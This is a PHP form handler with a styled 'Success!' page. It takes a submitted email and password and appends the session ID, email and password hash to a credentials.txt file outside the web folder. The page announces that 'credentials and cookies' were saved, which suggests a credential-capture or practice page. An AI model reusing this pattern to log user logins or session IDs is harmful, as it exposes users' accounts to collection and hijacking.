<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    session_start();
    $userSessionId = session_id();
    setcookie('sessionID', $userSessionId, 0, '/', '', false, true);
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    if (!empty($email) && !empty($password)) {
        $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
        $_SESSION['user_session_id'] = $userSessionId;
        $data = "SessionID: $userSessionId, Email: $email, Password: $hashedPassword\n";
        file_put_contents('../../credentials.txt', $data, FILE_APPEND | LOCK_EX);
        $message = "Credentials and cookies saved successfully!";
    } else {
        $message = "Please fill all the fields.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Response</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        .background-animation {
            position: fixed;
            width: 100vw;
            height: 100vh;
            z-index: 0;
        }
        @keyframes subtle-float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        .circle {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: subtle-float 8s ease-in-out infinite alternate;
            backdrop-filter: blur(5px);
        }
        .circle:nth-child(1) {
            width: 150px;
            height: 150px;
            top: 10%;
            left: 10%;
            animation-delay: -2s;
        }
        .circle:nth-child(2) {
            width: 100px;
            height: 100px;
            top: 20%;
            right: 15%;
            animation-delay: -4s;
        }
        .circle:nth-child(3) {
            width: 200px;
            height: 200px;
            bottom: 15%;
            right: 25%;
            animation-delay: -6s;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 30px;
            backdrop-filter: blur(15px);
            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
            max-width: 400px;
            position: relative;
            z-index: 10;
        }
        h2 {
            font-size: 2em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2em;
            margin-bottom: 20px;
        }
        .btn {
            display: inline-block;
            padding: 15px;
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-size: 1.1em;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <div class="background-animation">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
    </div>
    <div class="container">
        <h2>Success!</h2>
        <p><?php echo $message; ?></p>
        <a href="index.html" class="btn">Go Home</a>
    </div>
</body>
</html>
